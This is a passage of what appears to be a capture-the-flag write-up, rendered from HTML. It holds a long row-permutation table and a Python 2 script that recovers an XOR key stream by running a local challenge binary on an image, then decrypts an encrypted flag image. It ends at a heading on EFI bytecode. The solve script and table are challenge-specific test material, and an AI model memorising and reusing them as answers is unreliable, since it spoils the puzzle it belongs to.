class="line">20 : 155 ,</span><br><span class="line">21 : 91 ,</span><br><span class="line">22 : 385 ,</span><br><span class="line">23 : 137 ,</span><br><span class="line">24 : 549 ,</span><br><span class="line">25 : 696 ,</span><br><span class="line">26 : 599 ,</span><br><span class="line">27 : 436 ,</span><br><span class="line">28 : 263 ,</span><br><span class="line">29 : 69 ,</span><br><span class="line">30 : 211 ,</span><br><span class="line">31 : 348 ,</span><br><span class="line">32 : 171 ,</span><br><span class="line">33 : 294 ,</span><br><span class="line">34 : 624 ,</span><br><span class="line">35 : 286 ,</span><br><span class="line">36 : 480 ,</span><br><span class="line">37 : 514 ,</span><br><span class="line">38 : 571 ,</span><br><span class="line">39 : 134 ,</span><br><span class="line">40 : 503 ,</span><br><span class="line">41 : 57 ,</span><br><span class="line">42 : 101 ,</span><br><span class="line">43 : 390 ,</span><br><span class="line">44 : 96 ,</span><br><span class="line">45 : 467 ,</span><br><span class="line">46 : 17 ,</span><br><span class="line">47 : 508 ,</span><br><span class="line">48 : 45 ,</span><br><span class="line">49 : 199 ,</span><br><span class="line">50 : 151 ,</span><br><span class="line">51 : 207 ,</span><br><span class="line">52 : 677 ,</span><br><span class="line">53 : 228 ,</span><br><span class="line">54 : 94 ,</span><br><span class="line">55 : 471 ,</span><br><span class="line">56 : 203 ,</span><br><span class="line">57 : 40 ,</span><br><span class="line">58 : 148 ,</span><br><span class="line">59 : 419 ,</span><br><span class="line">60 : 9 ,</span><br><span class="line">61 : 669 ,</span><br><span class="line">62 : 242 ,</span><br><span class="line">63 : 3 ,</span><br><span class="line">64 : 198 ,</span><br><span class="line">65 : 68 ,</span><br><span class="line">66 : 6 ,</span><br><span class="line">67 : 412 ,</span><br><span class="line">68 : 256 ,</span><br><span class="line">69 : 31 ,</span><br><span class="line">70 : 478 ,</span><br><span class="line">71 : 22 ,</span><br><span class="line">72 : 88 ,</span><br><span class="line">73 : 187 ,</span><br><span class="line">74 : 274 ,</span><br><span class="line">75 : 67 ,</span><br><span class="line">76 : 526 ,</span><br><span class="line">77 : 163 ,</span><br><span class="line">78 : 125 ,</span><br><span class="line">79 : 38 ,</span><br><span class="line">80 : 666 ,</span><br><span class="line">81 : 225 ,</span><br><span class="line">82 : 217 ,</span><br><span class="line">83 : 410 ,</span><br><span class="line">84 : 353 ,</span><br><span class="line">85 : 37 ,</span><br><span class="line">86 : 25 ,</span><br><span class="line">87 : 204 ,</span><br><span class="line">88 : 473 ,</span><br><span class="line">89 : 532 ,</span><br><span class="line">90 : 186 ,</span><br><span class="line">91 : 127 ,</span><br><span class="line">92 : 183 ,</span><br><span class="line">93 : 33 ,</span><br><span class="line">94 : 92 ,</span><br><span class="line">95 : 106 ,</span><br><span class="line">96 : 487 ,</span><br><span class="line">97 : 59 ,</span><br><span class="line">98 : 120 ,</span><br><span class="line">99 : 223 ,</span><br><span class="line">100 : 511 ,</span><br><span class="line">101 : 376 ,</span><br><span class="line">102 : 573 ,</span><br><span class="line">103 : 685 ,</span><br><span class="line">104 : 47 ,</span><br><span class="line">105 : 51 ,</span><br><span class="line">106 : 635 ,</span><br><span class="line">107 : 579 ,</span><br><span class="line">108 : 342 ,</span><br><span class="line">109 : 214 ,</span><br><span class="line">110 : 634 ,</span><br><span class="line">111 : 93 ,</span><br><span class="line">112 : 139 ,</span><br><span class="line">113 : 179 ,</span><br><span class="line">114 : 54 ,</span><br><span class="line">115 : 41 ,</span><br><span class="line">116 : 221 ,</span><br><span class="line">117 : 520 ,</span><br><span class="line">118 : 512 ,</span><br><span class="line">119 : 102 ,</span><br><span class="line">120 : 181 ,</span><br><span class="line">121 : 161 ,</span><br><span class="line">122 : 158 ,</span><br><span class="line">123 : 443 ,</span><br><span class="line">124 : 254 ,</span><br><span class="line">125 : 167 ,</span><br><span class="line">126 : 413 ,</span><br><span class="line">127 : 113 ,</span><br><span class="line">128 : 560 ,</span><br><span class="line">129 : 335 ,</span><br><span class="line">130 : 55 ,</span><br><span class="line">131 : 80 ,</span><br><span class="line">132 : 296 ,</span><br><span class="line">133 : 252 ,</span><br><span class="line">134 : 176 ,</span><br><span class="line">135 : 272 ,</span><br><span class="line">136 : 288 ,</span><br><span class="line">137 : 12 ,</span><br><span class="line">138 : 269 ,</span><br><span class="line">139 : 566 ,</span><br><span class="line">140 : 26 ,</span><br><span class="line">141 : 24 ,</span><br><span class="line">142 : 382 ,</span><br><span class="line">143 : 30 ,</span><br><span class="line">144 : 265 ,</span><br><span class="line">145 : 365 ,</span><br><span class="line">146 : 87 ,</span><br><span class="line">147 : 475 ,</span><br><span class="line">148 : 7 ,</span><br><span class="line">149 : 625 ,</span><br><span class="line">150 : 4 ,</span><br><span class="line">151 : 562 ,</span><br><span class="line">152 : 21 ,</span><br><span class="line">153 : 79 ,</span><br><span class="line">154 : 95 ,</span><br><span class="line">155 : 268 ,</span><br><span class="line">156 : 219 ,</span><br><span class="line">157 : 150 ,</span><br><span class="line">158 : 35 ,</span><br><span class="line">159 : 734 ,</span><br><span class="line">160 : 60 ,</span><br><span class="line">161 : 85 ,</span><br><span class="line">162 : 191 ,</span><br><span class="line">163 : 154 ,</span><br><span class="line">164 : 350 ,</span><br><span class="line">165 : 136 ,</span><br><span class="line">166 : 62 ,</span><br><span class="line">167 : 358 ,</span><br><span class="line">168 : 293 ,</span><br><span class="line">169 : 386 ,</span><br><span class="line">170 : 325 ,</span><br><span class="line">171 : 404 ,</span><br><span class="line">172 : 83 ,</span><br><span class="line">173 : 356 ,</span><br><span class="line">174 : 239 ,</span><br><span class="line">175 : 373 ,</span><br><span class="line">176 : 368 ,</span><br><span class="line">177 : 112 ,</span><br><span class="line">178 : 445 ,</span><br><span class="line">179 : 103 ,</span><br><span class="line">180 : 142 ,</span><br><span class="line">181 : 145 ,</span><br><span class="line">182 : 0 ,</span><br><span class="line">183 : 603 ,</span><br><span class="line">184 : 48 ,</span><br><span class="line">185 : 568 ,</span><br><span class="line">186 : 195 ,</span><br><span class="line">187 : 97 ,</span><br><span class="line">188 : 701 ,</span><br><span class="line">189 : 621 ,</span><br><span class="line">190 : 275 ,</span><br><span class="line">191 : 28 ,</span><br><span class="line">192 : 165 ,</span><br><span class="line">193 : 52 ,</span><br><span class="line">194 : 114 ,</span><br><span class="line">195 : 421 ,</span><br><span class="line">196 : 189 ,</span><br><span class="line">197 : 122 ,</span><br><span class="line">198 : 129 ,</span><br><span class="line">199 : 18 ,</span><br><span class="line">200 : 743 ,</span><br><span class="line">201 : 706 ,</span><br><span class="line">202 : 259 ,</span><br><span class="line">203 : 209 ,</span><br><span class="line">204 : 143 ,</span><br><span class="line">205 : 19 ,</span><br><span class="line">206 : 50 ,</span><br><span class="line">207 : 238 ,</span><br><span class="line">208 : 206 ,</span><br><span class="line">209 : 128 ,</span><br><span class="line">210 : 236 ,</span><br><span class="line">211 : 75 ,</span><br><span class="line">212 : 416 ,</span><br><span class="line">213 : 333 ,</span><br><span class="line">214 : 192 ,</span><br><span class="line">215 : 738 ,</span><br><span class="line">216 : 285 ,</span><br><span class="line">217 : 168 ,</span><br><span class="line">218 : 71 ,</span><br><span class="line">219 : 138 ,</span><br><span class="line">220 : 597 ,</span><br><span class="line">221 : 16 ,</span><br><span class="line">222 : 73 ,</span><br><span class="line">223 : 149 ,</span><br><span class="line">224 : 672 ,</span><br><span class="line">225 : 162 ,</span><br><span class="line">226 : 76 ,</span><br><span class="line">227 : 673 ,</span><br><span class="line">228 : 231 ,</span><br><span class="line">229 : 194 ,</span><br><span class="line">230 : 713 ,</span><br><span class="line">231 : 141 ,</span><br><span class="line">232 : 130 ,</span><br><span class="line">233 : 505 ,</span><br><span class="line">234 : 72 ,</span><br><span class="line">235 : 482 ,</span><br><span class="line">236 : 119 ,</span><br><span class="line">237 : 337 ,</span><br><span class="line">238 : 77 ,</span><br><span class="line">239 : 166 ,</span><br><span class="line">240 : 178 ,</span><br><span class="line">241 : 606 ,</span><br><span class="line">242 : 10 ,</span><br><span class="line">243 : 208 ,</span><br><span class="line">244 : 563 ,</span><br><span class="line">245 : 751 ,</span><br><span class="line">246 : 111 ,</span><br><span class="line">247 : 360 ,</span><br><span class="line">248 : 684 ,</span><br><span class="line">249 : 304 ,</span><br><span class="line">250 : 66 ,</span><br><span class="line">251 : 146 ,</span><br><span class="line">252 : 454 ,</span><br><span class="line">253 : 432 ,</span><br><span class="line">254 : 104 ,</span><br><span class="line">255 : 46 ,</span><br><span class="line">256 : 222 ,</span><br><span class="line">257 : 767 ,</span><br><span class="line">258 : 761 ,</span><br><span class="line">259 : 184 ,</span><br><span class="line">260 : 564 ,</span><br><span class="line">261 : 557 ,</span><br><span class="line">262 : 529 ,</span><br><span class="line">263 : 400 ,</span><br><span class="line">264 : 132 ,</span><br><span class="line">265 : 20 ,</span><br><span class="line">266 : 586 ,</span><br><span class="line">267 : 694 ,</span><br><span class="line">268 : 1 ,</span><br><span class="line">269 : 116 ,</span><br><span class="line">270 : 108 ,</span><br><span class="line">271 : 366 ,</span><br><span class="line">272 : 524 ,</span><br><span class="line">273 : 131 ,</span><br><span class="line">274 : 250 ,</span><br><span class="line">275 : 124 ,</span><br><span class="line">276 : 558 ,</span><br><span class="line">277 : 569 ,</span><br><span class="line">278 : 140 ,</span><br><span class="line">279 : 226 ,</span><br><span class="line">280 : 315 ,</span><br><span class="line">281 : 667 ,</span><br><span class="line">282 : 359 ,</span><br><span class="line">283 : 450 ,</span><br><span class="line">284 : 396 ,</span><br><span class="line">285 : 230 ,</span><br><span class="line">286 : 82 ,</span><br><span class="line">287 : 188 ,</span><br><span class="line">288 : 426 ,</span><br><span class="line">289 : 23 ,</span><br><span class="line">290 : 43 ,</span><br><span class="line">291 : 659 ,</span><br><span class="line">292 : 616 ,</span><br><span class="line">293 : 27 ,</span><br><span class="line">294 : 233 ,</span><br><span class="line">295 : 528 ,</span><br><span class="line">296 : 753 ,</span><br><span class="line">297 : 749 ,</span><br><span class="line">298 : 361 ,</span><br><span class="line">299 : 308 ,</span><br><span class="line">300 : 551 ,</span><br><span class="line">301 : 617 ,</span><br><span class="line">302 : 290 ,</span><br><span class="line">303 : 727 ,</span><br><span class="line">304 : 115 ,</span><br><span class="line">305 : 464 ,</span><br><span class="line">306 : 543 ,</span><br><span class="line">307 : 593 ,</span><br><span class="line">308 : 289 ,</span><br><span class="line">309 : 522 ,</span><br><span class="line">310 : 316 ,</span><br><span class="line">311 : 641 ,</span><br><span class="line">312 : 109 ,</span><br><span class="line">313 : 84 ,</span><br><span class="line">314 : 297 ,</span><br><span class="line">315 : 240 ,</span><br><span class="line">316 : 299 ,</span><br><span class="line">317 : 352 ,</span><br><span class="line">318 : 213 ,</span><br><span class="line">319 : 282 ,</span><br><span class="line">320 : 702 ,</span><br><span class="line">321 : 61 ,</span><br><span class="line">322 : 100 ,</span><br><span class="line">323 : 490 ,</span><br><span class="line">324 : 388 ,</span><br><span class="line">325 : 346 ,</span><br><span class="line">326 : 15 ,</span><br><span class="line">327 : 609 ,</span><br><span class="line">328 : 255 ,</span><br><span class="line">329 : 554 ,</span><br><span class="line">330 : 587 ,</span><br><span class="line">331 : 578 ,</span><br><span class="line">332 : 105 ,</span><br><span class="line">333 : 279 ,</span><br><span class="line">334 : 411 ,</span><br><span class="line">335 : 29 ,</span><br><span class="line">336 : 762 ,</span><br><span class="line">337 : 394 ,</span><br><span class="line">338 : 311 ,</span><br><span class="line">339 : 36 ,</span><br><span class="line">340 : 741 ,</span><br><span class="line">341 : 224 ,</span><br><span class="line">342 : 283 ,</span><br><span class="line">343 : 537 ,</span><br><span class="line">344 : 340 ,</span><br><span class="line">345 : 44 ,</span><br><span class="line">346 : 697 ,</span><br><span class="line">347 : 323 ,</span><br><span class="line">348 : 90 ,</span><br><span class="line">349 : 469 ,</span><br><span class="line">350 : 180 ,</span><br><span class="line">351 : 414 ,</span><br><span class="line">352 : 329 ,</span><br><span class="line">353 : 229 ,</span><br><span class="line">354 : 664 ,</span><br><span class="line">355 : 680 ,</span><br><span class="line">356 : 312 ,</span><br><span class="line">357 : 653 ,</span><br><span class="line">358 : 157 ,</span><br><span class="line">359 : 241 ,</span><br><span class="line">360 : 483 ,</span><br><span class="line">361 : 405 ,</span><br><span class="line">362 : 497 ,</span><br><span class="line">363 : 264 ,</span><br><span class="line">364 : 331 ,</span><br><span class="line">365 : 49 ,</span><br><span class="line">366 : 670 ,</span><br><span class="line">367 : 401 ,</span><br><span class="line">368 : 343 ,</span><br><span class="line">369 : 655 ,</span><br><span class="line">370 : 322 ,</span><br><span class="line">371 : 74 ,</span><br><span class="line">372 : 656 ,</span><br><span class="line">373 : 607 ,</span><br><span class="line">374 : 455 ,</span><br><span class="line">375 : 243 ,</span><br><span class="line">376 : 246 ,</span><br><span class="line">377 : 726 ,</span><br><span class="line">378 : 65 ,</span><br><span class="line">379 : 470 ,</span><br><span class="line">380 : 486 ,</span><br><span class="line">381 : 218 ,</span><br><span class="line">382 : 690 ,</span><br><span class="line">383 : 174 ,</span><br><span class="line">384 : 319 ,</span><br><span class="line">385 : 321 ,</span><br><span class="line">386 : 34 ,</span><br><span class="line">387 : 736 ,</span><br><span class="line">388 : 202 ,</span><br><span class="line">389 : 395 ,</span><br><span class="line">390 : 332 ,</span><br><span class="line">391 : 384 ,</span><br><span class="line">392 : 584 ,</span><br><span class="line">393 : 291 ,</span><br><span class="line">394 : 64 ,</span><br><span class="line">395 : 759 ,</span><br><span class="line">396 : 561 ,</span><br><span class="line">397 : 307 ,</span><br><span class="line">398 : 589 ,</span><br><span class="line">399 : 663 ,</span><br><span class="line">400 : 305 ,</span><br><span class="line">401 : 271 ,</span><br><span class="line">402 : 757 ,</span><br><span class="line">403 : 387 ,</span><br><span class="line">404 : 232 ,</span><br><span class="line">405 : 612 ,</span><br><span class="line">406 : 580 ,</span><br><span class="line">407 : 220 ,</span><br><span class="line">408 : 383 ,</span><br><span class="line">409 : 215 ,</span><br><span class="line">410 : 362 ,</span><br><span class="line">411 : 354 ,</span><br><span class="line">412 : 78 ,</span><br><span class="line">413 : 660 ,</span><br><span class="line">414 : 459 ,</span><br><span class="line">415 : 700 ,</span><br><span class="line">416 : 397 ,</span><br><span class="line">417 : 507 ,</span><br><span class="line">418 : 604 ,</span><br><span class="line">419 : 2 ,</span><br><span class="line">420 : 623 ,</span><br><span class="line">421 : 424 ,</span><br><span class="line">422 : 698 ,</span><br><span class="line">423 : 525 ,</span><br><span class="line">424 : 98 ,</span><br><span class="line">425 : 160 ,</span><br><span class="line">426 : 13 ,</span><br><span class="line">427 : 594 ,</span><br><span class="line">428 : 277 ,</span><br><span class="line">429 : 403 ,</span><br><span class="line">430 : 273 ,</span><br><span class="line">431 : 548 ,</span><br><span class="line">432 : 379 ,</span><br><span class="line">433 : 402 ,</span><br><span class="line">434 : 374 ,</span><br><span class="line">435 : 750 ,</span><br><span class="line">436 : 156 ,</span><br><span class="line">437 : 598 ,</span><br><span class="line">438 : 752 ,</span><br><span class="line">439 : 249 ,</span><br><span class="line">440 : 643 ,</span><br><span class="line">441 : 730 ,</span><br><span class="line">442 : 423 ,</span><br><span class="line">443 : 267 ,</span><br><span class="line">444 : 320 ,</span><br><span class="line">445 : 172 ,</span><br><span class="line">446 : 463 ,</span><br><span class="line">447 : 630 ,</span><br><span class="line">448 : 197 ,</span><br><span class="line">449 : 357 ,</span><br><span class="line">450 : 425 ,</span><br><span class="line">451 : 501 ,</span><br><span class="line">452 : 417 ,</span><br><span class="line">453 : 707 ,</span><br><span class="line">454 : 306 ,</span><br><span class="line">455 : 153 ,</span><br><span class="line">456 : 662 ,</span><br><span class="line">457 : 298 ,</span><br><span class="line">458 : 540 ,</span><br><span class="line">459 : 39 ,</span><br><span class="line">460 : 257 ,</span><br><span class="line">461 : 398 ,</span><br><span class="line">462 : 742 ,</span><br><span class="line">463 : 745 ,</span><br><span class="line">464 : 453 ,</span><br><span class="line">465 : 756 ,</span><br><span class="line">466 : 675 ,</span><br><span class="line">467 : 370 ,</span><br><span class="line">468 : 565 ,</span><br><span class="line">469 : 133 ,</span><br><span class="line">470 : 737 ,</span><br><span class="line">471 : 645 ,</span><br><span class="line">472 : 317 ,</span><br><span class="line">473 : 372 ,</span><br><span class="line">474 : 287 ,</span><br><span class="line">475 : 722 ,</span><br><span class="line">476 : 42 ,</span><br><span class="line">477 : 763 ,</span><br><span class="line">478 : 476 ,</span><br><span class="line">479 : 336 ,</span><br><span class="line">480 : 81 ,</span><br><span class="line">481 : 601 ,</span><br><span class="line">482 : 538 ,</span><br><span class="line">483 : 121 ,</span><br><span class="line">484 : 575 ,</span><br><span class="line">485 : 765 ,</span><br><span class="line">486 : 718 ,</span><br><span class="line">487 : 63 ,</span><br><span class="line">488 : 341 ,</span><br><span class="line">489 : 173 ,</span><br><span class="line">490 : 420 ,</span><br><span class="line">491 : 711 ,</span><br><span class="line">492 : 261 ,</span><br><span class="line">493 : 516 ,</span><br><span class="line">494 : 185 ,</span><br><span class="line">495 : 70 ,</span><br><span class="line">496 : 541 ,</span><br><span class="line">497 : 205 ,</span><br><span class="line">498 : 517 ,</span><br><span class="line">499 : 440 ,</span><br><span class="line">500 : 539 ,</span><br><span class="line">501 : 477 ,</span><br><span class="line">502 : 695 ,</span><br><span class="line">503 : 448 ,</span><br><span class="line">504 : 513 ,</span><br><span class="line">505 : 640 ,</span><br><span class="line">506 : 86 ,</span><br><span class="line">507 : 686 ,</span><br><span class="line">508 : 89 ,</span><br><span class="line">509 : 678 ,</span><br><span class="line">510 : 349 ,</span><br><span class="line">511 : 596 ,</span><br><span class="line">512 : 452 ,</span><br><span class="line">513 : 637 ,</span><br><span class="line">514 : 182 ,</span><br><span class="line">515 : 164 ,</span><br><span class="line">516 : 481 ,</span><br><span class="line">517 : 418 ,</span><br><span class="line">518 : 278 ,</span><br><span class="line">519 : 309 ,</span><br><span class="line">520 : 363 ,</span><br><span class="line">521 : 668 ,</span><br><span class="line">522 : 649 ,</span><br><span class="line">523 : 409 ,</span><br><span class="line">524 : 14 ,</span><br><span class="line">525 : 292 ,</span><br><span class="line">526 : 99 ,</span><br><span class="line">527 : 721 ,</span><br><span class="line">528 : 591 ,</span><br><span class="line">529 : 632 ,</span><br><span class="line">530 : 212 ,</span><br><span class="line">531 : 284 ,</span><br><span class="line">532 : 495 ,</span><br><span class="line">533 : 652 ,</span><br><span class="line">534 : 731 ,</span><br><span class="line">535 : 496 ,</span><br><span class="line">536 : 367 ,</span><br><span class="line">537 : 518 ,</span><br><span class="line">538 : 159 ,</span><br><span class="line">539 : 688 ,</span><br><span class="line">540 : 689 ,</span><br><span class="line">541 : 466 ,</span><br><span class="line">542 : 457 ,</span><br><span class="line">543 : 472 ,</span><br><span class="line">544 : 510 ,</span><br><span class="line">545 : 485 ,</span><br><span class="line">546 : 600 ,</span><br><span class="line">547 : 428 ,</span><br><span class="line">548 : 441 ,</span><br><span class="line">549 : 392 ,</span><br><span class="line">550 : 479 ,</span><br><span class="line">551 : 262 ,</span><br><span class="line">552 : 530 ,</span><br><span class="line">553 : 147 ,</span><br><span class="line">554 : 747 ,</span><br><span class="line">555 : 506 ,</span><br><span class="line">556 : 521 ,</span><br><span class="line">557 : 310 ,</span><br><span class="line">558 : 658 ,</span><br><span class="line">559 : 391 ,</span><br><span class="line">560 : 123 ,</span><br><span class="line">561 : 546 ,</span><br><span class="line">562 : 547 ,</span><br><span class="line">563 : 636 ,</span><br><span class="line">564 : 523 ,</span><br><span class="line">565 : 327 ,</span><br><span class="line">566 : 434 ,</span><br><span class="line">567 : 610 ,</span><br><span class="line">568 : 585 ,</span><br><span class="line">569 : 53 ,</span><br><span class="line">570 : 245 ,</span><br><span class="line">571 : 682 ,</span><br><span class="line">572 : 615 ,</span><br><span class="line">573 : 556 ,</span><br><span class="line">574 : 542 ,</span><br><span class="line">575 : 705 ,</span><br><span class="line">576 : 144 ,</span><br><span class="line">577 : 704 ,</span><br><span class="line">578 : 728 ,</span><br><span class="line">579 : 766 ,</span><br><span class="line">580 : 328 ,</span><br><span class="line">581 : 196 ,</span><br><span class="line">582 : 559 ,</span><br><span class="line">583 : 627 ,</span><br><span class="line">584 : 280 ,</span><br><span class="line">585 : 581 ,</span><br><span class="line">586 : 216 ,</span><br><span class="line">587 : 177 ,</span><br><span class="line">588 : 676 ,</span><br><span class="line">589 : 620 ,</span><br><span class="line">590 : 491 ,</span><br><span class="line">591 : 572 ,</span><br><span class="line">592 : 258 ,</span><br><span class="line">593 : 193 ,</span><br><span class="line">594 : 534 ,</span><br><span class="line">595 : 692 ,</span><br><span class="line">596 : 324 ,</span><br><span class="line">597 : 577 ,</span><br><span class="line">598 : 754 ,</span><br><span class="line">599 : 406 ,</span><br><span class="line">600 : 474 ,</span><br><span class="line">601 : 732 ,</span><br><span class="line">602 : 748 ,</span><br><span class="line">603 : 408 ,</span><br><span class="line">604 : 170 ,</span><br><span class="line">605 : 494 ,</span><br><span class="line">606 : 456 ,</span><br><span class="line">607 : 175 ,</span><br><span class="line">608 : 755 ,</span><br><span class="line">609 : 739 ,</span><br><span class="line">610 : 709 ,</span><br><span class="line">611 : 326 ,</span><br><span class="line">612 : 502 ,</span><br><span class="line">613 : 458 ,</span><br><span class="line">614 : 531 ,</span><br><span class="line">615 : 449 ,</span><br><span class="line">616 : 744 ,</span><br><span class="line">617 : 631 ,</span><br><span class="line">618 : 555 ,</span><br><span class="line">619 : 281 ,</span><br><span class="line">620 : 247 ,</span><br><span class="line">621 : 438 ,</span><br><span class="line">622 : 303 ,</span><br><span class="line">623 : 533 ,</span><br><span class="line">624 : 314 ,</span><br><span class="line">625 : 381 ,</span><br><span class="line">626 : 638 ,</span><br><span class="line">627 : 460 ,</span><br><span class="line">628 : 444 ,</span><br><span class="line">629 : 725 ,</span><br><span class="line">630 : 447 ,</span><br><span class="line">631 : 626 ,</span><br><span class="line">632 : 338 ,</span><br><span class="line">633 : 527 ,</span><br><span class="line">634 : 733 ,</span><br><span class="line">635 : 135 ,</span><br><span class="line">636 : 462 ,</span><br><span class="line">637 : 210 ,</span><br><span class="line">638 : 504 ,</span><br><span class="line">639 : 355 ,</span><br><span class="line">640 : 611 ,</span><br><span class="line">641 : 126 ,</span><br><span class="line">642 : 619 ,</span><br><span class="line">643 : 545 ,</span><br><span class="line">644 : 295 ,</span><br><span class="line">645 : 270 ,</span><br><span class="line">646 : 300 ,</span><br><span class="line">647 : 227 ,</span><br><span class="line">648 : 393 ,</span><br><span class="line">649 : 582 ,</span><br><span class="line">650 : 724 ,</span><br><span class="line">651 : 11 ,</span><br><span class="line">652 : 544 ,</span><br><span class="line">653 : 407 ,</span><br><span class="line">654 : 553 ,</span><br><span class="line">655 : 712 ,</span><br><span class="line">656 : 313 ,</span><br><span class="line">657 : 465 ,</span><br><span class="line">658 : 595 ,</span><br><span class="line">659 : 681 ,</span><br><span class="line">660 : 714 ,</span><br><span class="line">661 : 651 ,</span><br><span class="line">662 : 118 ,</span><br><span class="line">663 : 760 ,</span><br><span class="line">664 : 583 ,</span><br><span class="line">665 : 629 ,</span><br><span class="line">666 : 330 ,</span><br><span class="line">667 : 422 ,</span><br><span class="line">668 : 301 ,</span><br><span class="line">669 : 378 ,</span><br><span class="line">670 : 499 ,</span><br><span class="line">671 : 602 ,</span><br><span class="line">672 : 377 ,</span><br><span class="line">673 : 618 ,</span><br><span class="line">674 : 622 ,</span><br><span class="line">675 : 665 ,</span><br><span class="line">676 : 592 ,</span><br><span class="line">677 : 302 ,</span><br><span class="line">678 : 519 ,</span><br><span class="line">679 : 201 ,</span><br><span class="line">680 : 570 ,</span><br><span class="line">681 : 260 ,</span><br><span class="line">682 : 461 ,</span><br><span class="line">683 : 642 ,</span><br><span class="line">684 : 723 ,</span><br><span class="line">685 : 489 ,</span><br><span class="line">686 : 484 ,</span><br><span class="line">687 : 764 ,</span><br><span class="line">688 : 399 ,</span><br><span class="line">689 : 657 ,</span><br><span class="line">690 : 590 ,</span><br><span class="line">691 : 687 ,</span><br><span class="line">692 : 451 ,</span><br><span class="line">693 : 415 ,</span><br><span class="line">694 : 318 ,</span><br><span class="line">695 : 429 ,</span><br><span class="line">696 : 468 ,</span><br><span class="line">697 : 446 ,</span><br><span class="line">698 : 488 ,</span><br><span class="line">699 : 708 ,</span><br><span class="line">700 : 716 ,</span><br><span class="line">701 : 244 ,</span><br><span class="line">702 : 654 ,</span><br><span class="line">703 : 710 ,</span><br><span class="line">704 : 550 ,</span><br><span class="line">705 : 535 ,</span><br><span class="line">706 : 608 ,</span><br><span class="line">707 : 8 ,</span><br><span class="line">708 : 746 ,</span><br><span class="line">709 : 253 ,</span><br><span class="line">710 : 435 ,</span><br><span class="line">711 : 671 ,</span><br><span class="line">712 : 433 ,</span><br><span class="line">713 : 683 ,</span><br><span class="line">714 : 729 ,</span><br><span class="line">715 : 334 ,</span><br><span class="line">716 : 699 ,</span><br><span class="line">717 : 107 ,</span><br><span class="line">718 : 276 ,</span><br><span class="line">719 : 715 ,</span><br><span class="line">720 : 248 ,</span><br><span class="line">721 : 574 ,</span><br><span class="line">722 : 605 ,</span><br><span class="line">723 : 646 ,</span><br><span class="line">724 : 613 ,</span><br><span class="line">725 : 235 ,</span><br><span class="line">726 : 633 ,</span><br><span class="line">727 : 169 ,</span><br><span class="line">728 : 493 ,</span><br><span class="line">729 : 735 ,</span><br><span class="line">730 : 628 ,</span><br><span class="line">731 : 693 ,</span><br><span class="line">732 : 509 ,</span><br><span class="line">733 : 344 ,</span><br><span class="line">734 : 679 ,</span><br><span class="line">735 : 437 ,</span><br><span class="line">736 : 347 ,</span><br><span class="line">737 : 674 ,</span><br><span class="line">738 : 364 ,</span><br><span class="line">739 : 427 ,</span><br><span class="line">740 : 644 ,</span><br><span class="line">741 : 639 ,</span><br><span class="line">742 : 442 ,</span><br><span class="line">743 : 500 ,</span><br><span class="line">744 : 650 ,</span><br><span class="line">745 : 648 ,</span><br><span class="line">746 : 719 ,</span><br><span class="line">747 : 431 ,</span><br><span class="line">748 : 515 ,</span><br><span class="line">749 : 536 ,</span><br><span class="line">750 : 691 ,</span><br><span class="line">751 : 588 ,</span><br><span class="line">752 : 720 ,</span><br><span class="line">753 : 430 ,</span><br><span class="line">754 : 266 ,</span><br><span class="line">755 : 647 ,</span><br><span class="line">756 : 380 ,</span><br><span class="line">757 : 614 ,</span><br><span class="line">758 : 200 ,</span><br><span class="line">759 : 567 ,</span><br><span class="line">760 : 498 ,</span><br><span class="line">761 : 740 ,</span><br><span class="line">762 : 717 ,</span><br><span class="line">763 : 703 ,</span><br><span class="line">764 : 758 ,</span><br><span class="line">765 : 369 ,</span><br><span class="line">766 : 110 ,</span><br><span class="line">767 : 389 ,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def get(x):</span><br><span class="line">    for i in t:</span><br><span class="line">        if t[i]==x:</span><br><span class="line">            return i;</span><br><span class="line">import os</span><br><span class="line">import commands; </span><br><span class="line">from PIL import Image</span><br><span class="line">im = Image.open(&apos;bmp2.png&apos;)</span><br><span class="line">im = im.convert(&apos;RGB&apos;)</span><br><span class="line">a = [];</span><br><span class="line">b = [];</span><br><span class="line"></span><br><span class="line">for i in range(768):</span><br><span class="line">    for j in range(768):</span><br><span class="line">        # print im.getpixel((0,i));</span><br><span class="line">        a.append( im.getpixel((i,j)) );</span><br><span class="line"></span><br><span class="line">commands.getoutput(&quot;./meow ./bmp2.png ./ret2.png&quot;);</span><br><span class="line"></span><br><span class="line">im = Image.open(&apos;ret2.png&apos;);</span><br><span class="line">im = im.convert(&apos;RGB&apos;);</span><br><span class="line">for i in range(768):</span><br><span class="line">    for j in range(768):</span><br><span class="line">        # print im.getpixel((0,i));</span><br><span class="line">        b.append( im.getpixel((i,j)) );</span><br><span class="line">im.close();</span><br><span class="line">c = [0] * (768*768);</span><br><span class="line">cc = [0] * (768*768);</span><br><span class="line">ccc = [0] * (768*768);</span><br><span class="line">for i in range(768):</span><br><span class="line">    for j in range(768):</span><br><span class="line">        # if a[i*768]==b[j*768]:</span><br><span class="line">            # print i,j;</span><br><span class="line">        c[i*768+j] = a[i*768+j][0] ^ b[ t[i]*768+j][0];</span><br><span class="line">        cc[i*768+j] = a[i*768+j][1] ^ b[ t[i]*768+j][1];</span><br><span class="line">        ccc[i*768+j] = a[i*768+j][2] ^ b[ t[i]*768+j][2];</span><br><span class="line">im = Image.open(&apos;flag_enc.png&apos;);</span><br><span class="line">im = im.convert(&apos;RGB&apos;);</span><br><span class="line"></span><br><span class="line">d = [];</span><br><span class="line">print &apos;flag--&gt;&apos;</span><br><span class="line">for i in range(768):</span><br><span class="line">    for j in range(768):</span><br><span class="line">        d.append( im.getpixel((i,j)) );</span><br><span class="line">    </span><br><span class="line">for i in range(768):</span><br><span class="line">    # print im.getpixel((i,0));</span><br><span class="line">    ha = get(i);</span><br><span class="line">    for j in range(768):</span><br><span class="line">        aa,bb,dd = d[i*768+j];</span><br><span class="line">        aa^=c[ ha*768+j];</span><br><span class="line">        bb^=cc[ ha*768+j];</span><br><span class="line">        dd^=ccc[ ha*768+j];</span><br><span class="line">        im.putpixel(( ha,j),(aa,bb,dd));</span><br><span class="line"></span><br><span class="line">im.save(&apos;flag.png&apos;)</span><br></pre></td></tr></table></figure>
<h1 id="EBC"><a href="#EBC" class="headerlink" title="EBC"></a>EBC</h1><p>EFI bytescode</p>
